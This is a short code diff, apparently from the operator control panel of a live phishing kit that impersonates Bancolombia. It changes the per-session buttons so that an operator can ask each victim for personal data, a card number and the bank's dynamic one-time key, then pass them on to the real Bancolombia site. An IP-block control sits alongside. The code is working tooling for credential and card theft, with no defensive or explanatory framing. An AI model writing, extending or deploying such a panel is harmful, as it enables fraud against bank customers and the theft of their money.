@@ -735,9 +735,10 @@ function botonesSesion(s) {
     if (bancoKey === 'bancolombia') {
         btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
-        btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-        btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
+        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir Datos Personales" onclick="accion('${sid}','PEDIR_DATOS')">👤</button>`);
+        btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Pedir Tarjeta (CC)" onclick="accion('${sid}','PEDIR_CC')">💳</button>`);
+        btns.push(`<button class="btn btn-otp" title="Pedir Clave Dinámica" onclick="accion('${sid}','PEDIR_DINAMICA')">🔢</button>`);
+        btns.push(`<button class="btn btn-final" title="Finalizar (Ir a Bancolombia)" onclick="accion('${sid}','FINALIZAR')">🏁</button>`);
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
